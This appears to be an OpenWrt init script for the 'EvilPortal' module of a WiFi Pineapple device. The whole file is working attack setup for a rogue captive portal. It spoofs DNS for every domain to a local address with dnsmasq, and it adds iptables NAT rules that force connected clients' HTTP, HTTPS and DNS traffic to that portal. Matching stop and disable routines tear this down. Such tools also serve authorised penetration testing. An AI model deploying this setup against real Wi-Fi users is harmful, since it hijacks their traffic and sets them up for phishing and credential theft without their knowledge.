#!/bin/sh /etc/rc.common

# This is the auto-start script for EvilPortal

START=200

start() {
    # Enable ip forward.
    echo 1 > /proc/sys/net/ipv4/ip_forward

    # Remove old authorized clients list
    rm /tmp/EVILPORTAL_CLIENTS.txt

    /etc/init.d/php7-fpm start
    /etc/init.d/nginx start

    # Start DNS MASQ to spoof * for unauthorized clients
    dnsmasq --no-hosts --no-resolv --address=/#/172.16.42.1 -p 5353

    # Symlink evilportal portal api
    rm /www/captiveportal
    ln -s /pineapple/ui/modules/evilportal/assets/api /www/captiveportal

    # Run iptables commands
    iptables -t nat -A PREROUTING -i br-lan -p tcp --dport 443 -j DNAT --to-destination 172.16.42.1:80
    iptables -t nat -A PREROUTING -i br-lan -p tcp --dport 80 -j DNAT --to-destination 172.16.42.1:80
    iptables -t nat -A PREROUTING -i br-lan -p tcp --dport 53 -j DNAT --to-destination 172.16.42.1:5353
    iptables -t nat -A PREROUTING -i br-lan -p udp --dport 53 -j DNAT --to-destination 172.16.42.1:5353
}

stop() {
    /etc/init.d/php7-fpm stop
    /etc/init.d/nginx stop

    kill $(netstat -plant | grep 5353 | awk '{print $NF}' | sed 's/\/dnsmasq//g' | head -n 1)

    rm /www/captiveportal
    iptables -t nat -D PREROUTING -i br-lan -p tcp --dport 443 -j DNAT --to-destination 172.16.42.1:80
    iptables -t nat -D PREROUTING -i br-lan -p tcp --dport 80 -j DNAT --to-destination 172.16.42.1:80
    iptables -t nat -D PREROUTING -i br-lan -p tcp --dport 53 -j DNAT --to-destination 172.16.42.1:5353
    iptables -t nat -D PREROUTING -i br-lan -p udp --dport 53 -j DNAT --to-destination 172.16.42.1:5353
}

disable() {
    rm /etc/rc.d/*evilportal
}
